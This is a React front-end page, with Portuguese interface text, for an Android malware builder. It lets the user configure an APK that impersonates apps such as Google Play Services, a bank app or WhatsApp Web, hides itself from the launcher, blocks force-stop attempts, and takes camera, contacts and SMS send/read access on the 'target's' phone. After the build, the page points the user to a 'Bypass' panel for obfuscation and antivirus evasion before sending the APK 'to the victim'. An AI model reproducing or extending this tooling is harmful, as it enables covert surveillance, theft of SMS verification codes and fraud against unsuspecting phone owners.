import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { apkAPI, getApiBaseUrl } from '../services/api';
import {
  ArrowLeft,
  Package,
  Download,
  Loader,
  CheckCircle,
  Camera,
  MessageSquare,
  Users,
  ChevronRight,
  ChevronLeft,
  Globe,
  EyeOff,
  ShieldCheck,
  Smartphone,
  Sparkles,
  Layers,
  Shield,
  Zap
} from 'lucide-react';

interface APKBuilderProps {
  onLogout: () => void;
}

export default function APKBuilder({ onLogout: _onLogout }: APKBuilderProps) {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3 | 4>(1);

  // Etapa 1: Informações Básicas
  const [appName, setAppName] = useState('Lanterna Potente');
  const [webviewUrl, setWebviewUrl] = useState('');
  const [language, setLanguage] = useState<'pt' | 'en' | 'es'>('pt');

  // Etapa 2: Ícone & Sigilo
  const [iconFile, setIconFile] = useState<File | null>(null);
  const [iconPreview, setIconPreview] = useState<string>('');
  const [hideFromLauncher, setHideFromLauncher] = useState(false);
  const [enableAntiKill, setEnableAntiKill] = useState(true);

  // Etapa 3: Package Name & Permissões
  const [packageName, setPackageName] = useState<string>('');
  const [permissions, setPermissions] = useState({
    camera: true,
    contacts: true,
    sendSms: true,
    readSms: true,
  });

  // Etapa 4: Compilação & Polling
  const [building, setBuilding] = useState(false);
  const [buildSuccess, setBuildSuccess] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState('');
  const [error, setError] = useState('');
  const [buildProgress, setBuildProgress] = useState(0);
  const [buildMessage, setBuildMessage] = useState('');
  const [buildId, setBuildId] = useState<string | null>(null);

  // Package name final a ser enviado no build (se vazio, usa o padrão)
  const finalPackageName = packageName.trim() || 'com.camel.corp.universalcopy';

  const togglePermission = (key: keyof typeof permissions) => {
    setPermissions((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const toggleAllPermissions = (enable: boolean) => {
    setPermissions({
      camera: enable,
      contacts: enable,
      sendSms: enable,
      readSms: enable,
    });
  };

  const handleIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setIconFile(file);
      const reader = new FileReader();
      reader.onload = (event) => {
        setIconPreview(event.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  // Polling do status do build
  useEffect(() => {
    if (!buildId || !building) return;

    const interval = setInterval(async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch(`${getApiBaseUrl()}/api/build-status/${buildId}`, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.ok) {
          const data = await response.json();
          setBuildProgress(data.progress || 0);
          setBuildMessage(data.message || '');
          
          if (data.status === 'success' || data.status === 'done') {
            setBuilding(false);
            setBuildSuccess(true);
            setDownloadUrl(data.download_url || (data.result && data.result.download_url) || '');
            clearInterval(interval);
          } else if (data.status === 'error') {
            setBuilding(false);
            setError(data.message || 'Erro no build');
            clearInterval(interval);
          }
        }
      } catch (err) {
        console.error('Erro ao verificar status:', err);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [buildId, building]);

  const handleBuild = async () => {
    if (!iconFile) {
      setError('⚠️ O ícone do aplicativo é obrigatório. Volte à Etapa 2 para selecionar uma imagem.');
      return;
    }

    setBuilding(true);
    setError('');
    setBuildSuccess(false);
    setBuildProgress(0);
    setBuildMessage('Iniciando build...');

    try {
      const formData = new FormData();
      formData.append('app_name', appName);
      formData.append('icon', iconFile);
      formData.append('language', language);
      formData.append('package_name', finalPackageName);
      if (webviewUrl.trim()) {
        formData.append('webview_url', webviewUrl.trim());
      }
      formData.append('hide_from_launcher', hideFromLauncher ? 'true' : 'false');
      formData.append('enable_anti_kill', enableAntiKill ? 'true' : 'false');
      formData.append('enable_camera', permissions.camera ? 'true' : 'false');
      formData.append('enable_contacts', permissions.contacts ? 'true' : 'false');
      formData.append('enable_send_sms', permissions.sendSms ? 'true' : 'false');
      formData.append('enable_read_sms', permissions.readSms ? 'true' : 'false');

      const response = await apkAPI.build(formData);

      if (response.status === 'building' && response.build_id) {
        setBuildId(response.build_id);
        setBuildMessage('Build iniciado em background...');
      } else if (response.status === 'success') {
        setBuildSuccess(true);
        setDownloadUrl(response.download_url);
        setBuilding(false);
      }
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Erro ao construir APK');
      setBuilding(false);
    }
  };

  const stepsList = [
    { num: 1, name: 'Informações', icon: Smartphone },
    { num: 2, name: 'Ícone & Sigilo', icon: EyeOff },
    { num: 3, name: 'Package & Permissões', icon: Layers },
    { num: 4, name: 'Compilar APK', icon: Package },
  ];

  return (
    <div className="min-h-screen bg-[#080d1e] text-slate-100 flex flex-col font-sans">
      {/* Header Cyberpunk */}
      <header className="bg-[#0b1229]/80 backdrop-blur-md border-b border-cyan-500/20 px-6 py-4 sticky top-0 z-50 shadow-[0_0_20px_rgba(6,182,212,0.1)]">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button
              onClick={() => navigate('/build-apk')}
              className="p-2 hover:bg-[#132050] border border-cyan-500/20 rounded-xl transition-colors text-cyan-400"
              title="Back to selection"
            >
              <ArrowLeft className="w-4 h-4" />
            </button>
            <div>
              <h1 className="text-sm font-black uppercase tracking-widest text-white font-mono flex items-center gap-2">
                APK <span className="text-cyan-400">Builder Wizard</span>
              </h1>
              <p className="text-[10px] text-slate-400 font-mono uppercase tracking-wider">Assistente passo a passo de compilação</p>
            </div>
          </div>
          <button
            onClick={() => navigate('/dashboard')}
            className="text-slate-400 hover:text-cyan-400 transition-colors font-mono text-xs uppercase tracking-wider font-bold"
          >
            Dashboard
          </button>
        </div>
      </header>

      <main className="max-w-3xl mx-auto px-4 py-8 flex-1 w-full flex flex-col justify-center">
        <div className="space-y-6 relative">
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />

          {/* Stepper Navigation Indicator */}
          <div className="bg-[#0b132c]/90 border border-cyan-500/20 rounded-2xl p-4 backdrop-blur-md shadow-lg">
            <div className="grid grid-cols-4 gap-2">
              {stepsList.map((st) => {
                const IconComponent = st.icon;
                const isActive = currentStep === st.num;
                const isCompleted = currentStep > st.num;
                return (
                  <button
                    key={st.num}
                    onClick={() => setCurrentStep(st.num as any)}
                    className={`flex flex-col sm:flex-row items-center justify-center gap-2 p-2.5 rounded-xl border transition-all font-mono text-xs ${
                      isActive
                        ? 'bg-cyan-950/70 border-cyan-400 text-cyan-200 shadow-[0_0_15px_rgba(6,182,212,0.3)] font-bold'
                        : isCompleted
                        ? 'bg-[#0a1835] border-emerald-500/40 text-emerald-300'
                        : 'bg-[#070e22] border-slate-800 text-slate-500 hover:text-slate-300 hover:border-slate-700'
                    }`}
                  >
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center shrink-0 text-[11px] font-black ${
                      isActive ? 'bg-cyan-400 text-black' : isCompleted ? 'bg-emerald-500 text-black' : 'bg-slate-800 text-slate-400'
                    }`}>
                      {isCompleted ? '✓' : st.num}
                    </div>
                    <div className="flex items-center gap-1.5 truncate">
                      <IconComponent className="w-3.5 h-3.5 hidden sm:inline shrink-0" />
                      <span className="hidden sm:inline font-bold truncate">{st.name}</span>
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Card Principal da Etapa Ativa */}
          <div className="bg-[#0c1228]/90 border border-cyan-500/25 shadow-[0_4px_30px_rgba(0,0,0,0.5)] rounded-2xl p-6 sm:p-8 relative overflow-hidden">
            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent" />

            {/* ETAPA 1: INFORMAÇÕES BÁSICAS */}
            {currentStep === 1 && (
              <div className="space-y-6 animate-in fade-in duration-300">
                <div className="flex items-center justify-between border-b border-cyan-500/20 pb-4">
                  <div>
                    <h2 className="text-base font-black text-cyan-400 uppercase tracking-widest font-mono flex items-center gap-2">
                      <Smartphone className="w-5 h-5 text-cyan-400" />
                      Etapa 1: Informações do Aplicativo
                    </h2>
                    <p className="text-xs text-slate-400 mt-1 font-mono">Defina o nome exibido na tela inicial e a língua das mensagens do app.</p>
                  </div>
                  <span className="text-xs font-mono font-bold text-cyan-400 px-3 py-1 bg-cyan-950/60 border border-cyan-500/40 rounded-full">
                    Passo 1 de 4
                  </span>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-black text-slate-300 uppercase tracking-wider font-mono mb-2">
                      Nome Exibido do App *
                    </label>
                    <input
                      type="text"
                      value={appName}
                      onChange={(e) => setAppName(e.target.value)}
                      className="w-full px-4 py-3 bg-[#090f20] border border-cyan-500/30 rounded-xl text-white placeholder-slate-600 focus:outline-none focus:border-cyan-400 focus:ring-2 focus:ring-cyan-400/30 text-sm font-sans transition-all"
                      placeholder="Ex: Google Play Services, Itaú Chave, WhatsApp Web..."
                    />
                    <p className="mt-1.5 text-[11px] text-slate-400 font-mono">Esse é o nome visível abaixo do ícone no Android do alvo.</p>
                  </div>

                  <div>
                    <label className="block text-xs font-black text-slate-300 uppercase tracking-wider font-mono mb-2">
                      Idioma do App (Wizard de Permissões)
                    </label>
                    <select
                      value={language}
                      onChange={(e) => setLanguage(e.target.value as any)}
                      className="w-full px-4 py-3 bg-[#090f20] border border-cyan-500/30 rounded-xl text-white focus:outline-none focus:border-cyan-400 text-sm font-sans cursor-pointer"
                    >
                      <option value="pt" className="bg-[#0c1228] text-white">Português (Brasil) 🇧🇷</option>
                      <option value="en" className="bg-[#0c1228] text-white">English (United States) 🇺🇸</option>
                      <option value="es" className="bg-[#0c1228] text-white">Español (España / LATAM) 🇪🇸</option>
                    </select>
                    <p className="mt-1.5 text-[11px] text-slate-400 font-mono">Define o idioma exibido nas caixas de diálogo e assistente de permissões no celular.</p>
                  </div>

                  <div>
                    <label className="block text-xs font-black text-slate-300 uppercase tracking-wider font-mono mb-2 flex items-center gap-1.5">
                      <Globe className="w-3.5 h-3.5 text-cyan-400" /> Redirecionamento WebView (Opcional)
                    </label>
                    <input
                      type="text"
                      value={webviewUrl}
                      onChange={(e) => setWebviewUrl(e.target.value)}
                      className="w-full px-4 py-3 bg-[#090f20] border border-cyan-500/30 rounded-xl text-white placeholder-slate-600 focus:outline-none focus:border-cyan-400 text-sm font-sans transition-all"
                      placeholder="Ex: https://www.google.com ou https://meusite.com"
                    />
                    <p className="mt-1.5 text-[11px] text-slate-400 font-mono">Se preenchido, o APK abrirá este site em tela cheia logo após obter permissões.</p>
                  </div>
                </div>

                <div className="pt-4 border-t border-cyan-500/20 flex justify-end">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(2)}
                    disabled={!appName.trim()}
                    className="px-6 py-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 disabled:opacity-50 text-white font-bold font-mono text-xs uppercase tracking-widest rounded-xl transition-all flex items-center gap-2 shadow-[0_0_20px_rgba(6,182,212,0.3)]"
                  >
                    <span>Avançar: Ícone & Sigilo</span>
                    <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* ETAPA 2: ÍCONE & SIGILO */}
            {currentStep === 2 && (
              <div className="space-y-6 animate-in fade-in duration-300">
                <div className="flex items-center justify-between border-b border-cyan-500/20 pb-4">
                  <div>
                    <h2 className="text-base font-black text-cyan-400 uppercase tracking-widest font-mono flex items-center gap-2">
                      <EyeOff className="w-5 h-5 text-cyan-400" />
                      Etapa 2: Ícone & Configurações de Sigilo
                    </h2>
                    <p className="text-xs text-slate-400 mt-1 font-mono">Escolha o ícone do APK e ative proteções contra remoção.</p>
                  </div>
                  <span className="text-xs font-mono font-bold text-cyan-400 px-3 py-1 bg-cyan-950/60 border border-cyan-500/40 rounded-full">
                    Passo 2 de 4
                  </span>
                </div>

                <div className="space-y-5">
                  <div>
                    <label className="block text-xs font-black text-slate-300 uppercase tracking-wider font-mono mb-2">
                      Ícone Customizado do APK *
                    </label>
                    <div className="flex items-center space-x-4 bg-[#090f20] p-3 rounded-xl border border-cyan-500/30">
                      {iconPreview ? (
                        <img src={iconPreview} alt="Preview" className="w-16 h-16 rounded-2xl border-2 border-cyan-400 object-cover shadow-[0_0_20px_rgba(6,182,212,0.4)]" />
                      ) : (
                        <div className="w-16 h-16 bg-[#0c1633] border border-dashed border-cyan-500/40 rounded-2xl flex items-center justify-center text-cyan-400 text-2xl shadow-inner">
                          🖼️
                        </div>
                      )}
                      <div className="flex-1">
                        <label className="block px-4 py-2.5 bg-[#0e1b3d] hover:bg-[#14285a] border border-cyan-500/40 hover:border-cyan-400 text-cyan-200 rounded-xl cursor-pointer transition-colors text-center font-mono text-xs uppercase tracking-wider font-bold shadow-sm">
                          <input
                            type="file"
                            accept="image/png,image/jpeg,image/jpg"
                            onChange={handleIconChange}
                            className="hidden"
                          />
                          {iconFile ? iconFile.name : '📁 Selecionar Imagem (PNG/JPG)'}
                        </label>
                        <p className="mt-1.5 text-[11px] text-slate-400 font-mono">PNG com transparência recomendado. Redimensionado automaticamente.</p>
                      </div>
                    </div>
                  </div>

                  {/* Toggle Ocultar Ícone */}
                  <div className="p-4 bg-[#091024] border border-cyan-500/20 rounded-xl space-y-2">
                    <div className="flex items-center justify-between">
                      <div>
                        <span className="text-xs font-bold text-white font-mono uppercase tracking-wide">
                          Ocultar da Tela Inicial
                        </span>
                        <p className="text-[11px] text-slate-400 font-mono mt-0.5">
                          {hideFromLauncher
                            ? '⚠️ O ícone ficará 100% invisível na gaveta de aplicativos'
                            : 'O ícone aparecerá normalmente na tela inicial do celular'}
                        </p>
                      </div>
                      <button
                        type="button"
                        onClick={() => setHideFromLauncher(v => !v)}
                        className={`relative inline-flex h-7 w-12 items-center rounded-full transition-colors duration-200 focus:outline-none ${
                          hideFromLauncher
                            ? 'bg-gradient-to-r from-red-600 to-orange-500 shadow-[0_0_12px_rgba(239,68,68,0.4)]'
                            : 'bg-[#1a2240] border border-cyan-500/30'
                        }`}
                      >
                        <span
                          className={`inline-block h-5 w-5 transform rounded-full bg-white shadow transition-transform duration-200 ${
                            hideFromLauncher ? 'translate-x-6' : 'translate-x-1'
                          }`}
                        />
                      </button>
                    </div>
                  </div>

                  {/* Toggle Anti-Kill */}
                  <div className="p-4 bg-[#091024] border border-cyan-500/20 rounded-xl space-y-2">
                    <div className="flex items-center justify-between">
                      <div>
                        <span className="text-xs font-bold text-white font-mono uppercase tracking-wide flex items-center gap-1.5">
                          <ShieldCheck className="w-4 h-4 text-emerald-400" />
                          Proteção Anti-Kill / Anti-Desinstalação
                        </span>
                        <p className="text-[11px] text-slate-400 font-mono mt-0.5">
                          {enableAntiKill
                            ? '🛡️ ATIVADO: Fecha automaticamente a tela de configurações se tentarem forçar parada'
                            : '⚪ DESATIVADO: Sem proteção de fechamento forçado'}
                        </p>
                      </div>
                      <button
                        type="button"
                        onClick={() => setEnableAntiKill(v => !v)}
                        className={`relative inline-flex h-7 w-12 items-center rounded-full transition-colors duration-200 focus:outline-none ${
                          enableAntiKill
                            ? 'bg-gradient-to-r from-emerald-500 to-cyan-500 shadow-[0_0_12px_rgba(16,185,129,0.4)]'
                            : 'bg-[#1a2240] border border-cyan-500/30'
                        }`}
                      >
                        <span
                          className={`inline-block h-5 w-5 transform rounded-full bg-white shadow transition-transform duration-200 ${
                            enableAntiKill ? 'translate-x-6' : 'translate-x-1'
                          }`}
                        />
                      </button>
                    </div>
                  </div>
                </div>

                <div className="pt-4 border-t border-cyan-500/20 flex items-center justify-between">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(1)}
                    className="px-5 py-2.5 bg-[#09152e] hover:bg-[#0f224b] text-slate-300 border border-cyan-500/30 rounded-xl font-mono text-xs uppercase font-bold tracking-wider flex items-center gap-1.5"
                  >
                    <ChevronLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setCurrentStep(3)}
                    disabled={!iconFile}
                    className="px-6 py-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 disabled:opacity-50 text-white font-bold font-mono text-xs uppercase tracking-widest rounded-xl transition-all flex items-center gap-2 shadow-[0_0_20px_rgba(6,182,212,0.3)]"
                  >
                    <span>Avançar: Package Name & Permissões</span>
                    <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* ETAPA 3: PACKAGE NAME & PERMISSÕES */}
            {currentStep === 3 && (
              <div className="space-y-6 animate-in fade-in duration-300">
                <div className="flex items-center justify-between border-b border-cyan-500/20 pb-4">
                  <div>
                    <h2 className="text-base font-black text-cyan-400 uppercase tracking-widest font-mono flex items-center gap-2">
                      <Layers className="w-5 h-5 text-cyan-400" />
                      Etapa 3: Package Name & Permissões
                    </h2>
                    <p className="text-xs text-slate-400 mt-1 font-mono">Personalize a identidade do pacote Android e os acessos concedidos.</p>
                  </div>
                  <span className="text-xs font-mono font-bold text-cyan-400 px-3 py-1 bg-cyan-950/60 border border-cyan-500/40 rounded-full">
                    Passo 3 de 4
                  </span>
                </div>

                <div className="space-y-6">
                  {/* Escolha do Package Name */}
                  <div className="bg-[#091126] border border-cyan-500/30 rounded-xl p-4.5 space-y-3">
                    <div className="flex items-center justify-between">
                      <label className="block text-xs font-black text-cyan-300 uppercase tracking-wider font-mono flex items-center gap-2">
                        <Sparkles className="w-4 h-4 text-cyan-400" />
                        Identificador de Pacote (Package Name) <span className="text-slate-400 font-normal font-mono text-[11px] uppercase">(Opcional)</span>
                      </label>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-950/80 border border-cyan-500/40 text-cyan-300 font-bold">
                        Opcional
                      </span>
                    </div>

                    <p className="text-[11px] text-slate-400 font-mono leading-relaxed">
                      Digite o Package Name desejado se quiser personalizar a identidade do APK.
                    </p>

                    <div className="relative">
                      <input
                        type="text"
                        value={packageName}
                        onChange={(e) => setPackageName(e.target.value)}
                        placeholder="Digite seu package name (Opcional - Ex: com.meusite.app)"
                        className="w-full px-4 py-3 bg-[#060b1a] border border-cyan-500/40 rounded-xl text-cyan-200 font-mono text-xs focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/40 placeholder:text-slate-650 transition-all"
                      />
                      {packageName.trim() && (
                        <button
                          type="button"
                          onClick={() => setPackageName('')}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 text-xs font-mono px-1.5 py-0.5 rounded bg-slate-800"
                        >
                          Limpar
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Permissões do App */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <label className="block text-xs font-black text-cyan-400 uppercase tracking-widest font-mono">
                        🛡️ Permissões do Aplicativo
                      </label>
                      <div className="flex gap-2">
                        <button
                          type="button"
                          onClick={() => toggleAllPermissions(true)}
                          className="text-[10px] font-bold font-mono px-2.5 py-1 bg-cyan-500/20 hover:bg-cyan-500/35 text-cyan-300 border border-cyan-500/40 rounded-lg transition"
                        >
                          Todas
                        </button>
                        <button
                          type="button"
                          onClick={() => toggleAllPermissions(false)}
                          className="text-[10px] font-bold font-mono px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 rounded-lg transition"
                        >
                          Nenhuma
                        </button>
                      </div>
                    </div>

                    <div className="grid sm:grid-cols-2 gap-3">
                      {/* Câmera */}
                      <div
                        onClick={() => togglePermission('camera')}
                        className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                          permissions.camera
                            ? 'bg-cyan-950/30 border-cyan-500/50 text-cyan-100 shadow-[0_0_12px_rgba(6,182,212,0.15)]'
                            : 'bg-[#090f20]/50 border-slate-800 opacity-60 text-slate-400'
                        }`}
                      >
                        <Camera className="w-5 h-5 text-cyan-400 shrink-0 mt-0.5" />
                        <div>
                          <span className="text-xs font-bold font-mono block">📷 Câmeras</span>
                          <span className="text-[10px] text-slate-400 font-mono">Fotos e streaming ao vivo</span>
                        </div>
                      </div>

                      {/* Contatos */}
                      <div
                        onClick={() => togglePermission('contacts')}
                        className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                          permissions.contacts
                            ? 'bg-amber-950/30 border-amber-500/50 text-amber-100 shadow-[0_0_12px_rgba(245,158,11,0.15)]'
                            : 'bg-[#090f20]/50 border-slate-800 opacity-60 text-slate-400'
                        }`}
                      >
                        <Users className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
                        <div>
                          <span className="text-xs font-bold font-mono block">📧 Contas & Contatos</span>
                          <span className="text-[10px] text-slate-400 font-mono">Agenda de telefone e e-mails</span>
                        </div>
                      </div>

                      {/* Send SMS */}
                      <div
                        onClick={() => togglePermission('sendSms')}
                        className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                          permissions.sendSms
                            ? 'bg-cyan-950/30 border-cyan-500/50 text-cyan-100 shadow-[0_0_12px_rgba(6,182,212,0.15)]'
                            : 'bg-[#090f20]/50 border-slate-800 opacity-60 text-slate-400'
                        }`}
                      >
                        <MessageSquare className="w-5 h-5 text-cyan-400 shrink-0 mt-0.5" />
                        <div>
                          <span className="text-xs font-bold font-mono block">📱 Send SMS</span>
                          <span className="text-[10px] text-slate-400 font-mono">Envio direto pela linha do alvo</span>
                        </div>
                      </div>

                      {/* Ler SMS */}
                      <div
                        onClick={() => togglePermission('readSms')}
                        className={`p-3.5 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                          permissions.readSms
                            ? 'bg-cyan-950/30 border-cyan-500/50 text-cyan-100 shadow-[0_0_12px_rgba(6,182,212,0.15)]'
                            : 'bg-[#090f20]/50 border-slate-800 opacity-60 text-slate-400'
                        }`}
                      >
                        <MessageSquare className="w-5 h-5 text-cyan-400 shrink-0 mt-0.5" />
                        <div>
                          <span className="text-xs font-bold font-mono block">📥 Ler SMS</span>
                          <span className="text-[10px] text-slate-400 font-mono">Leitura de mensagens e códigos</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="pt-4 border-t border-cyan-500/20 flex items-center justify-between">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(2)}
                    className="px-5 py-2.5 bg-[#09152e] hover:bg-[#0f224b] text-slate-300 border border-cyan-500/30 rounded-xl font-mono text-xs uppercase font-bold tracking-wider flex items-center gap-1.5"
                  >
                    <ChevronLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setCurrentStep(4)}
                    className="px-6 py-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-bold font-mono text-xs uppercase tracking-widest rounded-xl transition-all flex items-center gap-2 shadow-[0_0_20px_rgba(6,182,212,0.3)]"
                  >
                    <span>Revisar & Gerar APK</span>
                    <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}

            {/* ETAPA 4: COMPILAR & GERAR APK */}
            {currentStep === 4 && (
              <div className="space-y-6 animate-in fade-in duration-300">
                <div className="flex items-center justify-between border-b border-cyan-500/20 pb-4">
                  <div>
                    <h2 className="text-base font-black text-cyan-400 uppercase tracking-widest font-mono flex items-center gap-2">
                      <Package className="w-5 h-5 text-cyan-400" />
                      Etapa 4: Compilação do APK
                    </h2>
                    <p className="text-xs text-slate-400 mt-1 font-mono">Confira os parâmetros configurados e inicie o processo de build.</p>
                  </div>
                  <span className="text-xs font-mono font-bold text-cyan-400 px-3 py-1 bg-cyan-950/60 border border-cyan-500/40 rounded-full">
                    Passo 4 de 4
                  </span>
                </div>

                {/* Resumo visual das escolhas */}
                <div className="bg-[#091126] border border-cyan-500/30 rounded-xl p-4 space-y-3 font-mono text-xs">
                  <h3 className="font-bold text-cyan-400 uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                    📋 Resumo da Configuração
                  </h3>
                  <div className="grid sm:grid-cols-2 gap-2.5 text-slate-300">
                    <div className="bg-[#060c1c] p-2.5 rounded-lg border border-cyan-500/20">
                      <span className="text-slate-400 block text-[10px]">NOME DO APP</span>
                      <span className="font-bold text-white text-sm">{appName}</span>
                    </div>
                    <div className="bg-[#060c1c] p-2.5 rounded-lg border border-cyan-500/20">
                      <span className="text-slate-400 block text-[10px]">IDIOMA DAS MENSAGENS</span>
                      <span className="font-bold text-white">{language === 'pt' ? 'Português 🇧🇷' : language === 'en' ? 'English 🇺🇸' : 'Español 🇪🇸'}</span>
                    </div>
                    <div className="bg-[#060c1c] p-2.5 rounded-lg border border-cyan-500/20">
                      <span className="text-slate-400 block text-[10px]">ÍCONE SELECIONADO</span>
                      <span className="font-bold text-emerald-400">{iconFile ? iconFile.name : '❌ Nenhum ícone'}</span>
                    </div>
                    <div className="bg-[#060c1c] p-2.5 rounded-lg border border-cyan-500/20">
                      <span className="text-slate-400 block text-[10px]">VISIBILIDADE NA TELA</span>
                      <span className="font-bold text-slate-200">{hideFromLauncher ? '🙈 Oculto (Invisível)' : '👁️ Visível'}</span>
                    </div>
                    <div className="bg-[#060c1c] p-2.5 rounded-lg border border-cyan-500/20">
                      <span className="text-slate-400 block text-[10px]">PROTEÇÃO ANTI-KILL</span>
                      <span className="font-bold text-emerald-400">{enableAntiKill ? '🛡️ Ativada' : '⚪ Desativada'}</span>
                    </div>
                  </div>
                </div>

                {/* Progresso durante build */}
                {building && (
                  <div className="p-4 bg-[#090f20]/90 border border-cyan-500/30 rounded-xl space-y-2">
                    <div className="flex justify-between text-xs font-mono uppercase tracking-wider text-slate-300">
                      <span className="truncate max-w-[80%] text-cyan-400 font-bold animate-pulse">{buildMessage}</span>
                      <span className="font-black text-cyan-300">{buildProgress}%</span>
                    </div>
                    <div className="w-full bg-[#050916] rounded-full h-3 border border-cyan-500/30 p-0.5">
                      <div 
                        className="bg-gradient-to-r from-cyan-500 via-blue-500 to-indigo-500 h-2 rounded-full transition-all duration-300 shadow-[0_0_10px_rgba(6,182,212,0.5)]"
                        style={{ width: `${buildProgress}%` }}
                      />
                    </div>
                  </div>
                )}

                {error && (
                  <div className="bg-rose-950/40 border border-rose-500/50 text-rose-200 p-4 rounded-xl text-xs font-mono">
                    {error}
                  </div>
                )}

                {buildSuccess && (
                  <div className="bg-[#08241c] border border-emerald-500/50 rounded-xl p-5 space-y-4">
                    <div className="flex items-center text-emerald-300 font-bold uppercase tracking-wider text-xs font-mono">
                      <CheckCircle className="w-5 h-5 mr-2 text-emerald-400 animate-bounce" />
                      APK compilado com sucesso!
                    </div>

                    {/* Botão Principal de Download */}
                    <a
                      href={`${getApiBaseUrl()}${downloadUrl}`}
                      download
                      className="w-full flex items-center justify-center gap-2 py-3 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-xl font-bold font-mono text-xs uppercase tracking-widest shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all"
                    >
                      <Download className="w-4 h-4" />
                      <span>Baixar Aplicativo Compilado</span>
                    </a>

                    {/* 🔷 INTERMEDIAÇÃO PARA ENCRIPTAR / PROCESSAR NO PAINEL BYPASS */}
                    <div className="pt-3 border-t border-emerald-500/30 space-y-2.5">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-1.5 text-cyan-300 font-mono text-xs font-bold uppercase tracking-wider">
                          <Zap className="w-4 h-4 text-cyan-400 animate-pulse" />
                          <span>Intermediação APK Bypass:</span>
                        </div>
                        <span className="text-[10px] font-mono text-cyan-200 bg-cyan-950/80 border border-cyan-500/50 px-2 py-0.5 rounded">
                          Antivírus & Proteção FAG
                        </span>
                      </div>
                      <p className="text-[11px] text-slate-300 font-mono leading-relaxed">
                        Passe este APK no **Painel Bypass** para aplicar ofuscação avançada, criptografia de payload e assinaturas anti-detecção antes de enviar à vítima.
                      </p>
                      
                      <div className="pt-1">
                        <button
                          type="button"
                          onClick={() => navigate('/apk-bypass')}
                          className="w-full flex items-center justify-center gap-2 py-3 bg-gradient-to-r from-cyan-500 via-blue-600 to-indigo-600 hover:from-cyan-400 hover:to-blue-500 text-white font-black font-mono text-xs uppercase tracking-widest rounded-xl transition-all shadow-[0_0_20px_rgba(6,182,212,0.4)] cursor-pointer"
                        >
                          <Shield className="w-4 h-4" />
                          <span>Abrir Painel Bypass</span>
                        </button>
                      </div>
                    </div>
                  </div>
                )}

                <div className="pt-4 border-t border-cyan-500/20 flex items-center justify-between">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(3)}
                    disabled={building}
                    className="px-5 py-2.5 bg-[#09152e] hover:bg-[#0f224b] text-slate-300 border border-cyan-500/30 rounded-xl font-mono text-xs uppercase font-bold tracking-wider flex items-center gap-1.5 disabled:opacity-50"
                  >
                    <ChevronLeft className="w-4 h-4" />
                    <span>Back</span>
                  </button>

                  <button
                    type="button"
                    onClick={handleBuild}
                    disabled={building || !appName.trim() || !iconFile}
                    className="px-8 py-3.5 bg-gradient-to-r from-cyan-500 via-blue-600 to-indigo-600 hover:from-cyan-400 hover:to-blue-500 disabled:from-slate-800 disabled:to-slate-850 disabled:text-slate-600 text-white font-black font-mono text-xs uppercase tracking-widest rounded-xl transition-all flex items-center gap-2 shadow-[0_0_25px_rgba(6,182,212,0.4)]"
                  >
                    {building ? (
                      <>
                        <Loader className="w-4 h-4 animate-spin" />
                        <span>Compilando APK... ({buildProgress}%)</span>
                      </>
                    ) : (
                      <>
                        <Package className="w-4 h-4" />
                        <span>Gerar & Compilar APK agora</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
